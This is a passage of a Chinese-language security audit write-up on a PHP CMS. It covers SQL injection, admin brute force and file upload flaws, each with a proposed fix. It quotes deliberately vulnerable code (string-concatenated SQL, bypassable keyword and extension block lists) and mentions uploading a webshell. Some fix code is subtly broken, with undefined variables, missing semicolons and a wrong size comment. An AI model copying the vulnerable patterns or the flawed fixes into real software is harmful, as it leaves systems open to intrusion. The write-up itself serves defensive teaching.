+      	<span class="hljs-variable">$deny_str</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27; &#x27;</span>,<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;from&#x27;</span>,<span class="hljs-string">&#x27;or&#x27;</span>,<span class="hljs-string">&#x27;and&#x27;</span>);
+      	<span class="hljs-variable">$username</span> = str_ireplace(<span class="hljs-variable">$deny_str</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$username</span>);
+      	<span class="hljs-variable">$result</span> = Db::query(<span class="hljs-string">&quot;select `email` from yzn_member where username=&#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>)[<span class="hljs-number">0</span>];
+
+      	<span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$result</span>))&#123;
+      		<span class="hljs-variable">$email</span> = <span class="hljs-variable">$result</span>[<span class="hljs-string">&#x27;email&#x27;</span>];
+      		<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;查询成功! &#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;的邮箱是:&#x27;</span>;
+	<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$username</span>,<span class="hljs-string">&#x27;email&#x27;</span>=&gt;<span class="hljs-variable">$email</span>]);
+      	&#125;<span class="hljs-keyword">else</span>&#123;
+      		<span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;查询失败，&#x27;</span>.<span class="hljs-variable">$username</span>.<span class="hljs-string">&#x27;不存在,请检查用户名是否正确!&#x27;</span>;
+      		<span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>]);
+      	&#125;
+      &#125;
+      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/finduser&#x27;</span>);
+  &#125;</code></pre></div>
+
+<p>可以看到，对用户提交的数据进行了过滤，但是过滤的内容很少，而且很容易就被绕过</p>
+<h4 id="漏洞防御-6"><a href="#漏洞防御-6" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p>这里的防御就可以直接使用上面过滤函数</p>
+<h3 id="漏洞点四-2"><a href="#漏洞点四-2" class="headerlink" title="漏洞点四"></a><strong>漏洞点四</strong></h3><p>代码位置<code>application\member\controller\Content.php</code></p>
+<h4 id="代码分析-6"><a href="#代码分析-6" class="headerlink" title="代码分析"></a>代码分析</h4><div class="hljs"><pre><code class="hljs php"><span class="hljs-variable">$id</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;param(<span class="hljs-string">&#x27;id&#x27;</span>, <span class="hljs-number">0</span>);
+            <span class="hljs-variable">$info</span> = Db::query(<span class="hljs-string">&#x27;SELECT * FROM `yzn_member_content` WHERE `uid` = &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;userid.<span class="hljs-string">&#x27; AND `id` = &#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27; LIMIT 1&#x27;</span>)[<span class="hljs-number">0</span>];
+            <span class="hljs-keyword">if</span> (<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$info</span>)) &#123;
+                <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&#x27;稿件不存在！&#x27;</span>);
+            &#125;</code></pre></div>
+
+<p>这里直接将用户提交的数据id，带入到sql语句中查询，并且没有进行过滤</p>
+<h4 id="漏洞防御-7"><a href="#漏洞防御-7" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
+<p>  因为id是一个数字，那么直接对id这个参数进行限制，只允许用户提交数字型数据</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!is_numeric(<span class="hljs-variable">$id</span>))&#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;id必须是数字！&quot;</span>)
+&#125;</code></pre></div>
+
+<p><strong>方法二</strong></p>
+<p>与上面的方法二一样，对id参数进行过滤</p>
+<h2 id="6-暴力破解-1"><a href="#6-暴力破解-1" class="headerlink" title="6.暴力破解"></a>6.暴力破解</h2><h3 id="代码分析-7"><a href="#代码分析-7" class="headerlink" title="代码分析"></a>代码分析</h3><p>该漏洞存在于管理员后台登录，造成该漏洞的原因大多是因为管理人员没有修改初始密码，或者心存侥幸改成了比较常见的密码，这样就给了攻击者可乘之机，直接使用暴力破解就可以攻克后台管理页面。</p>
+<p>代码位于<code>application\admin\controller\Index.php</code>中的<code>login()</code>方法</p>
+<div class="hljs"><pre><code class="hljs php"> <span class="hljs-comment">//登录判断</span>
+ <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">login</span>(<span class="hljs-params"></span>)</span>
+<span class="hljs-function"> </span>&#123;
+     <span class="hljs-variable">$url</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;get(<span class="hljs-string">&#x27;url&#x27;</span>, <span class="hljs-string">&#x27;index/index&#x27;</span>);
+     <span class="hljs-keyword">if</span> (User::instance()-&gt;isLogin()) &#123;
+         <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);
+     &#125;
+     <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;request-&gt;isPost()) &#123;
+         <span class="hljs-variable">$data</span>      = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post();
+         <span class="hljs-variable">$keeplogin</span> = <span class="hljs-keyword">$this</span>-&gt;request-&gt;post(<span class="hljs-string">&#x27;keeplogin&#x27;</span>);
+<span class="hljs-comment">// 对提交数据进行检查</span>
+         <span class="hljs-variable">$rule</span> = [
+             <span class="hljs-string">&#x27;username|用户名&#x27;</span> =&gt; <span class="hljs-string">&#x27;require|alphaDash|length:3,20&#x27;</span>,
+             <span class="hljs-string">&#x27;password|密码&#x27;</span>  =&gt; <span class="hljs-string">&#x27;require|length:3,20&#x27;</span>,
+             <span class="hljs-string">&#x27;__token__&#x27;</span>    =&gt; <span class="hljs-string">&#x27;require|token&#x27;</span>,
+         ];
+         <span class="hljs-variable">$result</span> = <span class="hljs-keyword">$this</span>-&gt;validate(<span class="hljs-variable">$data</span>, <span class="hljs-variable">$rule</span>);
+         <span class="hljs-keyword">if</span> (<span class="hljs-literal">true</span> !== <span class="hljs-variable">$result</span>) &#123;
+             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$result</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);
+         &#125;
+         <span class="hljs-keyword">if</span> (User::instance()-&gt;login(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;
+             <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;恭喜您，登陆成功&#x27;</span>, url(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));
+         &#125; <span class="hljs-keyword">else</span> &#123;
+             <span class="hljs-variable">$msg</span> = User::instance()-&gt;getError();
+             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;用户名或者密码错误!&#x27;</span>;
+             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);
+         &#125;
+     &#125; <span class="hljs-keyword">else</span> &#123;
+         <span class="hljs-keyword">if</span> (User::instance()-&gt;autologin()) &#123;
+             <span class="hljs-keyword">$this</span>-&gt;redirect(<span class="hljs-string">&#x27;admin/index/index&#x27;</span>);
+         &#125;
+         <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch();
+     &#125;
+ &#125;</code></pre></div>
+
+
+
+<p>虽然每次登录都需要带有token，但是也是不安全的，因为token的值是可以从前端页面获取的</p>
+<h3 id="漏洞防御-8"><a href="#漏洞防御-8" class="headerlink" title="漏洞防御"></a>漏洞防御</h3><p>防御方法就是限制管理员登录时密码输入的错误次数，当错误次数达到一定数量时，就锁定该账号，需要拥有数据库管理权限的真正管理员才能重新登录。</p>
+<p>首先在数据库中创建一个表<code>yzn_loginfo</code>，里面只需要一个字段，用来记录admin账号连续输入错误密码的次数。</p>
+<p>具体方法为</p>
+<p>首先进入mysql容器内部</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">docker</span> exec -it ed<span class="hljs-number">1</span>c<span class="hljs-number">19</span>bb<span class="hljs-number">4</span>a<span class="hljs-number">95</span> bash</code></pre></div>
+
+<p>之后登录root账号，在数据库中建立一张表</p>
+<div class="hljs"><pre><code class="hljs sql"><span class="hljs-keyword">CREATE</span> <span class="hljs-keyword">TABLE</span> IF <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">EXISTS</span> `yzn_loginfo` (
+  `login_fail` <span class="hljs-type">int</span>(<span class="hljs-number">10</span>) <span class="hljs-keyword">NOT</span> <span class="hljs-keyword">NULL</span>
+) ENGINE<span class="hljs-operator">=</span>MyISAM <span class="hljs-keyword">DEFAULT</span> CHARSET<span class="hljs-operator">=</span>utf8;</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408102912089.png" srcset="/img/loading.gif" alt="image-20210408102912089"></p>
+<p>修改代码<code>application\admin\controller\Index.php</code>中的<code>login()</code>方法</p>
+<p>其中戴// 是增加的代码</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-comment">// 从yzn_loginfo表中获取到 login_fail的值</span>
+<span class="hljs-variable">$login_fail</span> = Db::query(<span class="hljs-string">&#x27;SELECT * FROM `yzn_loginfo`&#x27;</span>)[<span class="hljs-number">0</span>]; <span class="hljs-comment">//</span>
+         <span class="hljs-variable">$login_fail_count</span> = <span class="hljs-variable">$login_fail</span>[<span class="hljs-string">&#x27;login_fail&#x27;</span>];     <span class="hljs-comment">// </span>
+<span class="hljs-comment">// 如果密码错误超过 5 则锁定账号</span>
+         <span class="hljs-keyword">if</span>(<span class="hljs-variable">$login_fail_count</span> &gt;= <span class="hljs-number">5</span>)&#123;                        <span class="hljs-comment">//	</span>
+             <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;账号被锁定，请联系网站管理员！&quot;</span>;			 <span class="hljs-comment">//</span>
+             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>,<span class="hljs-variable">$url</span>);					   <span class="hljs-comment">//</span>
+         &#125;
+
+         <span class="hljs-keyword">if</span> (User::instance()-&gt;login(<span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;username&#x27;</span>], <span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$keeplogin</span> ? <span class="hljs-number">86400</span> : <span class="hljs-number">0</span>)) &#123;
+          <span class="hljs-comment">// 如果输入的密码正确，说明是真正的admin，将login_fail值更新为0</span>
+             Db::query(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`=0 WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>); 							<span class="hljs-comment">// </span>
+             <span class="hljs-keyword">$this</span>-&gt;success(<span class="hljs-string">&#x27;恭喜您，登陆成功&#x27;</span>, url(<span class="hljs-string">&#x27;admin/Index/index&#x27;</span>));
+         &#125; <span class="hljs-keyword">else</span> &#123;
+             <span class="hljs-variable">$msg</span> = User::instance()-&gt;getError();
+             <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$msg</span> ? <span class="hljs-variable">$msg</span> : <span class="hljs-string">&#x27;用户名或者密码错误!&#x27;</span>;
+             <span class="hljs-comment">// 如果输入的密码不正确，则将login_fail的值+1后再到数据库中更新</span>
+             <span class="hljs-variable">$login_fail_count_new</span> = <span class="hljs-variable">$login_fail_count</span> + <span class="hljs-number">1</span>;  <span class="hljs-comment">//</span>
+             Db::query(<span class="hljs-string">&#x27;UPDATE `yzn_loginfo` SET `login_fail`= &#x27;</span>.<span class="hljs-variable">$login_fail_count_new</span>.<span class="hljs-string">&#x27; WHERE `login_fail`=&#x27;</span>.<span class="hljs-variable">$login_fail_count</span>);							  <span class="hljs-comment">//</span>
+             <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-variable">$msg</span>, <span class="hljs-variable">$url</span>, [<span class="hljs-string">&#x27;token&#x27;</span> =&gt; <span class="hljs-keyword">$this</span>-&gt;request-&gt;token()]);
+         &#125;</code></pre></div>
+
+
+
+<p>当连续输错五次密码时，账号就被锁定，此时没有任何人能够登录，必须到数据库中需改<code>yzn_loginfo</code>的<code>login_fail</code>的值，这也就达到了防止暴力破解的攻击。</p>
+<p>即执行下面这个sql语句</p>
+<div class="hljs"><pre><code class="hljs n1ql"><span class="hljs-keyword">UPDATE</span> <span class="hljs-symbol">`yzn_loginfo`</span> <span class="hljs-keyword">SET</span> <span class="hljs-symbol">`login_fail`</span>=<span class="hljs-number">0</span> <span class="hljs-keyword">WHERE</span> <span class="hljs-symbol">`login_fail`</span>= <span class="hljs-number">5</span>;</code></pre></div>
+
+
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210408104728600.png" srcset="/img/loading.gif" alt="image-20210408104728600"></p>
+<h2 id="7-文件上传"><a href="#7-文件上传" class="headerlink" title="7.文件上传"></a>7.文件上传</h2><h3 id="漏洞点一-6"><a href="#漏洞点一-6" class="headerlink" title="漏洞点一"></a><strong>漏洞点一</strong></h3><h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p><code>application\member\controller\Index.php</code> 中的photo方法</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;
+    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
+    <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;
+    define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);
+    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
+    <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+
+     <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>,<span class="hljs-string">&quot;php5&quot;</span>,<span class="hljs-string">&quot;php4&quot;</span>,<span class="hljs-string">&quot;php3&quot;</span>,<span class="hljs-string">&quot;php2&quot;</span>,<span class="hljs-string">&quot;html&quot;</span>,<span class="hljs-string">&quot;htm&quot;</span>,<span class="hljs-string">&quot;phtml&quot;</span>,<span class="hljs-string">&quot;pht&quot;</span>,<span class="hljs-string">&quot;jsp&quot;</span>,<span class="hljs-string">&quot;jspa&quot;</span>,<span class="hljs-string">&quot;jspx&quot;</span>,<span class="hljs-string">&quot;jsw&quot;</span>,<span class="hljs-string">&quot;jsv&quot;</span>,<span class="hljs-string">&quot;jspf&quot;</span>,<span class="hljs-string">&quot;jtml&quot;</span>,<span class="hljs-string">&quot;asp&quot;</span>,<span class="hljs-string">&quot;aspx&quot;</span>,<span class="hljs-string">&quot;asa&quot;</span>,<span class="hljs-string">&quot;asax&quot;</span>,<span class="hljs-string">&quot;ascx&quot;</span>,<span class="hljs-string">&quot;ashx&quot;</span>,<span class="hljs-string">&quot;asmx&quot;</span>,<span class="hljs-string">&quot;cer&quot;</span>,<span class="hljs-string">&quot;swf&quot;</span>,<span class="hljs-string">&quot;htaccess&quot;</span>,<span class="hljs-string">&quot;ini&quot;</span>);
+        
+      <span class="hljs-variable">$file_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+   	  <span class="hljs-variable">$file_name</span> = str_ireplace(<span class="hljs-variable">$deny_ext</span>,<span class="hljs-string">&quot;&quot;</span>, <span class="hljs-variable">$file_name</span>);
+      <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+
+      <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;
+
+      <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传成功！&#x27;</span>;
+       &#125; <span class="hljs-keyword">else</span> &#123;
+                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+       &#125;
+        
+    &#125; <span class="hljs-keyword">else</span> &#123;
+        <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
+    &#125;
+    &#125;
+    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);
+&#125;</code></pre></div>
+
+<p>可以看到上面是使用黑名单，对含有黑名单后缀的文件进行替换，显示这样是很不安全的，使用双写即可绕过，造成了文件上传漏洞</p>
+<h4 id="漏洞防御-9"><a href="#漏洞防御-9" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><div class="hljs"><pre><code class="hljs php">  <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">photo</span>(<span class="hljs-params"></span>)</span>&#123;
+      <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
+      <span class="hljs-variable">$path</span> = <span class="hljs-string">&quot;./uploads/images/photo&quot;</span>;
+      define(<span class="hljs-string">&quot;UPLOAD_PATH&quot;</span>,<span class="hljs-string">&quot;../public/uploads/images/photo&quot;</span>);
+      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;
+      <span class="hljs-keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;
+        <span class="hljs-variable">$uploaded_name</span> = trim(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);
+  <span class="hljs-variable">$uploaded_size</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;size&#x27;</span> ];
+  <span class="hljs-variable">$uploaded_type</span> = <span class="hljs-variable">$_FILES</span>[ <span class="hljs-string">&#x27;upload_file&#x27;</span> ][ <span class="hljs-string">&#x27;type&#x27;</span> ];
+        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];
+
+          <span class="hljs-comment">//文件上传漏洞修复 </span>
+        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$uploaded_name</span>;
+  <span class="hljs-keyword">if</span>( ( strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;jpg&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;gif&#x27;</span> || strtolower( <span class="hljs-variable">$uploaded_ext</span> ) == <span class="hljs-string">&#x27;png&#x27;</span> ) &amp;&amp;
+( <span class="hljs-variable">$uploaded_size</span> &lt; <span class="hljs-number">100000</span> ) &amp;&amp; getimagesize( <span class="hljs-variable">$uploaded_tmp</span> ) &amp;&amp; 
+( <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/jpeg&#x27;</span> || <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/png&#x27;</span>|| <span class="hljs-variable">$uploaded_type</span> == <span class="hljs-string">&#x27;image/gif&#x27;</span> ) 
+            ) &#123;
+            <span class="hljs-keyword">if</span> (move_uploaded_file(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;
+                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传成功！&#x27;</span>;
+        	   &#125; <span class="hljs-keyword">else</span> &#123;
+                  <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;
+         	   &#125;
+        &#125;<span class="hljs-keyword">else</span>&#123;
+            <span class="hljs-keyword">$this</span>-&gt;error(<span class="hljs-string">&quot;文件类型不正确&quot;</span>)
+  &#125;         
+      &#125; <span class="hljs-keyword">else</span> &#123;
+          <span class="hljs-variable">$msg</span> = <span class="hljs-variable">$path</span> . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;
+          <span class="hljs-keyword">echo</span> <span class="hljs-variable">$msg</span>;
+      &#125;
+      &#125;
+      <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;fetch(<span class="hljs-string">&#x27;/photo&#x27;</span>,[<span class="hljs-string">&#x27;msg&#x27;</span>=&gt;<span class="hljs-variable">$msg</span>,<span class="hljs-string">&#x27;path&#x27;</span>=&gt;<span class="hljs-variable">$img_path</span>]);
+  &#125;
+
+</code></pre></div>
+
+<p>其中if中的条件如下</p>
+<ul>
+<li><p><code>( strtolower( $uploaded_ext ) == &#39;jpg&#39; || strtolower( $uploaded_ext ) == &#39;gif&#39; || strtolower( $uploaded_ext ) == &#39;png&#39; )</code></p>
+<p>保证文件后缀名只能是<code>jpg gif png</code>的一个</p>
+</li>
+<li><p><code>( $uploaded_type == &#39;image/jpeg&#39; || $uploaded_type == &#39;image/png&#39;|| $uploaded_type == &#39;image/gif&#39; )</code></p>
+<p>文件的MIME必须为三者中的一个</p>
+</li>
+<li><p><code>( $uploaded_size &lt; 100000 ) &amp;&amp; getimagesize( $uploaded_tmp )</code></p>
+<p>这是保证文件的大小小10M，并且文件不能空</p>
+</li>
+</ul>
+<h3 id="漏洞点二-6"><a href="#漏洞点二-6" class="headerlink" title="漏洞点二"></a>漏洞点二</h3><h4 id="代码分析-9"><a href="#代码分析-9" class="headerlink" title="代码分析"></a>代码分析</h4><p>改代码位于<code>application\attachment\controller\Upload.php</code>中的saveFile方法</p>
+<div class="hljs"><pre><code class="hljs php"><span class="hljs-keyword">if</span> (<span class="hljs-variable">$size_limit</span> &gt; <span class="hljs-number">0</span> &amp;&amp; (<span class="hljs-variable">$file</span>-&gt;getInfo(<span class="hljs-string">&#x27;size&#x27;</span>) &gt; <span class="hljs-variable">$size_limit</span>)) &#123;
+    <span class="hljs-keyword">return</span> json([
+        <span class="hljs-string">&#x27;status&#x27;</span>  =&gt; <span class="hljs-number">0</span>,
+        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>,
+        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>, <span class="hljs-comment">//兼容百度</span>
+        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;附件过大&#x27;</span>, <span class="hljs-comment">//兼容editormd</span>
+    ]);
+&#125;
+<span class="hljs-comment">// 判断附件格式是否符合</span>
+<span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>-&gt;getInfo(<span class="hljs-string">&#x27;name&#x27;</span>);
+
+<span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;
+
+<span class="hljs-keyword">if</span> (<span class="hljs-variable">$error_msg</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;
+    <span class="hljs-keyword">return</span> json([
+        <span class="hljs-string">&#x27;code&#x27;</span>    =&gt; <span class="hljs-number">-1</span>,
+        <span class="hljs-string">&#x27;info&#x27;</span>    =&gt; <span class="hljs-variable">$error_msg</span>,
+        <span class="hljs-string">&#x27;state&#x27;</span>   =&gt; <span class="hljs-variable">$error_msg</span>, <span class="hljs-comment">//兼容百度</span>
+        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-variable">$error_msg</span>, <span class="hljs-comment">//兼容editormd</span>
+    ]);
+&#125;</code></pre></div>
+
+<p>可以看到这段代码中只是对上传附件的大小进行了检查，而没有对文件的后缀和文件的MIME进行检查，这样攻击者就可以任意的上传文件，造成文件上传漏洞，危害还是很大的。</p>
+<h4 id="漏洞防御-10"><a href="#漏洞防御-10" class="headerlink" title="漏洞防御"></a>漏洞防御</h4><p><strong>方法一</strong></p>
+<p>对于其的防御方法就是获取文件的类型然后检查其是否符合要求。这里只允许上传<code>png,jpg,jpeg,gif,bmp</code>类型的文件</p>
+<div class="hljs"><pre><code class="hljs php">      <span class="hljs-variable">$file_ext</span>  = strtolower(substr(<span class="hljs-variable">$file_name</span>, strrpos(<span class="hljs-variable">$file_name</span>, <span class="hljs-string">&#x27;.&#x27;</span>) + <span class="hljs-number">1</span>));<span class="hljs-comment">//获取文件的后缀名</span>
+
+<span class="hljs-comment">// 获取文件的MiME,注意这里不是从客户端的请求头中获取的，而是根据文件的后缀名从php函数中获取，这样就可以防止攻击者修改MIME进行欺骗</span>
+      <span class="hljs-keyword">try</span> &#123;
+          <span class="hljs-variable">$fileMine</span> = <span class="hljs-variable">$file</span>-&gt;getMime();
+      &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$ex</span>) &#123;
+          <span class="hljs-variable">$error_msg</span> = <span class="hljs-variable">$ex</span>-&gt;getMessage();
+      &#125;
+<span class="hljs-comment">// 禁止MIME为text/x-php或text/html</span>
+      <span class="hljs-keyword">if</span> (<span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/x-php&#x27;</span> || <span class="hljs-variable">$fileMine</span> == <span class="hljs-string">&#x27;text/html&#x27;</span>) &#123;
+          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
+      &#125;
+<span class="hljs-comment">//禁止后缀名为php的</span>
+      <span class="hljs-keyword">if</span> (preg_grep(<span class="hljs-string">&quot;/php/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
+          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
+      &#125;
+<span class="hljs-comment">// 禁止上传文件名后缀名在$ext_limit中的</span>
+      <span class="hljs-keyword">if</span> (!preg_grep(<span class="hljs-string">&quot;/<span class="hljs-subst">$file_ext</span>/i&quot;</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
+          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;附件类型不正确！&#x27;</span>;
+      &#125;
+      <span class="hljs-keyword">if</span> (!in_array(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$ext_limit</span>)) &#123;
+          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;附件类型不正确！&#x27;</span>;
+      &#125;
+<span class="hljs-comment">// 禁止上传php,html后缀的文件</span>
+      <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;php&quot;</span> || <span class="hljs-variable">$file_ext</span> == <span class="hljs-string">&quot;html&quot;</span>) &#123;
+          <span class="hljs-variable">$error_msg</span> = <span class="hljs-string">&#x27;禁止上传非法文件！&#x27;</span>;
+      &#125;</code></pre></div>
+
+
+
+<p><strong>方法二</strong></p>
+<p>对保存文件的目录修改权限。</p>
+<p>已经知道，用户上传的文件会被保存到的<code>public/uploads/images</code>目录下，首先查看一下该文件的权限信息</p>
+<div class="hljs"><pre><code class="hljs avrasm">ls -<span class="hljs-keyword">ld</span> images/</code></pre></div>
+
+<p><img src="https://sunzy-1304004755.cos.ap-nanjing.myqcloud.com/img/image-20210405202954282.png" srcset="/img/loading.gif" alt="image-20210405202954282"></p>
+<p>可以看到这是777权限，很明显这个权限设置是不合理的，那么我们将其改为744权限</p>
+<div class="hljs"><pre><code class="hljs apache"><span class="hljs-attribute">chmod</span> -R <span class="hljs-number">744</span> images/</code></pre></div>
+
+<p>再来查看之前上传上的木马文件就会发现文件不存在，这样就会避免了一句话木马的危害</p>
